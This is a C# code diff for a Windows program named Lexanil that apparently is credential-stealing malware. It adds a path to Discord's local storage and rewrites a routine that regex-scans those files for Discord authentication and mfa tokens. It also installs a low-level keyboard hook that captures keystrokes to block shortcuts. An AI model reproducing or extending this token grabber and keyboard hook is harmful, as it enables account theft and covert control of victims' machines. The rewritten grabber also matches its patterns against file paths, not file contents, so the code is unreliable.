@@ -59,7 +59,7 @@ namespace Lexanil
         public static readonly string Startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
         public static readonly string Lxnl = Path.Combine(AppData, ".lxnl");
         public static readonly string OurAppPath = Assembly.GetExecutingAssembly().Location;
-
+        public static readonly string DiscordDB = Path.Combine(AppData, @"Roaming\Discord\Local Storage\leveldb");
     }
 
     public partial class MainWindow : Form
@@ -181,9 +181,7 @@ namespace Lexanil
 
         private void disableShortcuts()
         {
-            ProcessModule objCurrentModule = Process.GetCurrentProcess().MainModule;
-            objKeyboardProcess = new LowLevelKeyboardProc(captureKey);
-            ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(objCurrentModule.ModuleName), 0);
+            ptrHook = SetWindowsHookEx(13, captureKey, IntPtr.Zero, 0);
         }
 
         private string GetLocalIPAddress()
@@ -222,30 +220,25 @@ namespace Lexanil
 
         private List<string> getDiscordTokens()
         {
-            List<string> captures = new List<string>();
-            DirectoryInfo rootfolder = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Discord\Local Storage\leveldb");
+            var captures = new List<string>();
 
-            foreach (var file in rootfolder.GetFiles(false ? "*.log" : "*.ldb"))
+            if (Directory.Exists(Paths.DiscordDB))
             {
-                string openedfile = file.OpenText().ReadToEnd();
+                var files = Directory.EnumerateFiles(Paths.DiscordDB, "*.ldb", SearchOption.AllDirectories);
 
-                foreach (Match match in Regex.Matches(openedfile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
-                    captures.Add(match.Value + "\n");
-
-                foreach (Match match in Regex.Matches(openedfile, @"mfa\.[\w-]{84}"))
-                    captures.Add(match.Value + "\n");
+                captures.AddRange(
+                    files
+                    .SelectMany(x => Regex.Matches(x, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}").Cast<Match>())
+                    .Select(x => x.Value)
+                    .Concat(
+                        files
+                        .SelectMany(x => Regex.Matches(x, @"mfa\.[\w-]{84}").Cast<Match>())
+                        .Select(x => x.Value)
+                        )
+                    );
             }
 
-
-            captures = captures.ToList();
-
-            Console.WriteLine(captures);
-
-            if (captures.Count > 0)
-            {
-                foundSth = true;
-            }
-            else
+            if (captures.Count == 0)
                 captures.Add("Empty");
 
             return captures;
